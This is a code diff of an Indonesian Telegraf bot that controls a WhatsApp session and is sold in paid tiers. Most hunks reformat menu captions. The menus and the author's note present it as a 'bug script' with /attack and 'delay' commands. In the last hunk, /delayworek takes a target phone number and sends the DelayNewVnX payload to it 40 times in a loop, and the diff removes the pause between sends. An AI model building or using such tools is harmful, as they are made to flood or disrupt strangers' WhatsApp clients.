@@ -1083,14 +1083,13 @@ async function sendHome(ctx) {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
@@ -1112,20 +1111,20 @@ bot.action("xsettings", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+╭═───⊱『 𝐗𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐌𝐄𝐍𝐔 』───═⬡
+
 ◇ /update          
 ◇ /connect
 ◇ /addprem
@@ -1146,6 +1145,7 @@ bot.action("xsettings", async (ctx) => {
 ◇ /runtime
 ◇ /mode
 ◇ /cekowner
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1158,25 +1158,24 @@ bot.action("xbugs", async (ctx) => {
   const sender = isWhatsAppConnected;
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
-◇ /specterdelay 
-◇ /delayworek_v1
+╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
+◇ /specterdelay
 
-<blockquote>╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡</blockquote>
+╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
 ◇ /attack
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1189,26 +1188,27 @@ bot.action("tools", async (ctx) => {
   const sender = isWhatsAppConnected;   
 
   const caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡</blockquote>            
+╭═───⊱『 𝐓𝐎𝐎𝐋𝐒 』───═⬡
+              
 ◇ /brat
 ◇ /tiktokdl
 ◇ /convert
 ◇ /waktu
 ◇ /ssiphone
 ◇ /cekidch
+</pre>
 `;
 
   await editMenu(ctx, caption, [[{ text: "🔙𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "backmenu", style: "primary" }]]);
@@ -1229,20 +1229,19 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 1) {
     caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡</blockquote>
+╭═───⊱『 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 』───═⬡
               
 ◇40K FULL UP SCRIPT
 ◇50K RESELLER SCRIPT
@@ -1250,6 +1249,7 @@ async function showInfo(ctx, page = 1) {
 ◇75K MODERATOR SCRIPT
 ◇90K CEO SCRIPT
 ◇110K OWNER SCRIPT
+</pre>
 `;
 
     keyboard = [
@@ -1265,21 +1265,21 @@ async function showInfo(ctx, page = 1) {
 
   if (page === 2) {
     caption = `
-<blockquote>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』───═⬡</blockquote>
+<pre>╭═───⊱『 𝐆𝐗𝐈𝐎𝐍 』 ───═⬡
 ◇ Developer : @Bawzhhh
-◇ System : Auto Update
 ◇ Version : 1.0 New Era
 ◇ Language : JavaScript
 ◇ Framework : Telegraf 
 
-<blockquote>╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡</blockquote>
+╭═───⊱『 𝐒𝐓𝐀𝐓𝐔𝐒 』 ───═⬡
 ◇ Stats Premium : ${premium ? "Yes" : "No"}
 ◇ Stats Sender : ${sender ? "Yes" : "No"}
 ◇ Runtime : ${runtime(process.uptime())}
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
-<blockquote>╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡</blockquote>
+╭═───⊱『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 』───═⬡
  olaa saya Bawzhhh ingin memberitahu bahwa script ini adalah karya milik saya, saya berterimakasih kalian sudah memakai script bug ini walaupun ampas yakh hehe, titik bahagia seseorang adalah ketika karyanya di gunakan tanpa adanya rasa terpaksa tapi dengan hati yang tulus Terimakasih 
+</pre>
 `;
 
     keyboard = [
@@ -2146,25 +2146,24 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
   })();
 
 });
-/// ============= CASE BUG 1 BEBAS SPAM=============\\\
-bot.command("delayworek_v1", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+/// CASE BUG BEBAS SPAM 2/// 
+bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
   const q = ctx.message.text.split(" ")[1]; 
-  if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
+  if (!q) return ctx.reply("🪧 ☇ Example : /delayworek 62xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-  await ctx.reply(`✅ delayworek_v1 (bug) selesai untuk ${q}`);
+  await ctx.reply(`✅ delayworek (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 30; r++) {
+    for (let r = 0; r < 40; r++) {
   await DelayNewVnX(sock, target);
-  await sleep(4000);
 }
   })();
 
 });
-/// CASE BUG 3///
+/// CASE BUG 2///
 bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   try {
     const q = ctx.message?.text?.split(" ")[1];
